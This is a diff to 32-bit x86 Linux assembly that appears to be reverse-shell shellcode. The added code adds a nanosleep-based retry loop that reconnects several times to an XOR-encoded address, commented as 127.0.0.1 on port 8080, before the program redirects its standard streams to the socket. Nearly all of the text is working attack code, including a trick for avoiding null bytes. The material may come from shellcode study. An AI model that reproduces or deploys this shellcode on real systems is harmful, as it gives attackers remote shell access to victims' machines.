@@ -19,6 +19,11 @@ section .data
     argv        dd      arg0, arg1, 0
     envv        dd      env0, 0
 
+    timeval:
+        tv_sec  dd      5
+        tv_usec dd      1
+
+
 _start:
 ; We first need to create a socket
 ; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
@@ -46,7 +51,46 @@ _start:
     mov         ebx, edi
     mov         ax, CONNECT
     int         80h             ; execute
+    inc         eax
+    mov         esi, 4
+    cmp         eax, 1
+    jne         retry
+    jmp         continue
 
+; If connection fails
+retry:
+    xchg        edi, ebx
+    mov         eax, 162
+    mov         ebx, timeval
+    mov         ecx, 0
+    int         0x80
+; Then connect to ip and port
+    xor         ecx, ecx
+    mul         ecx
+    push        ecx
+    push        ecx
+    mov         ecx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
+    xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
+    push        ecx
+    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
+    push        word AF_INET    ; AF_INET (2)
+    mov         ecx, esp
+    push        0x10
+    pop         edx
+
+    mov         ebx, edi
+    mov         ax, CONNECT
+    int         80h             ; execute
+    inc         eax
+    cmp         eax, 1
+    je          continue
+
+    dec         esi
+    cmp         esi, 1
+    jne         retry
+    jmp         continue
+
+continue:
 ; Get input and redirect output
     xchg        ebx, edi
     push        0x2
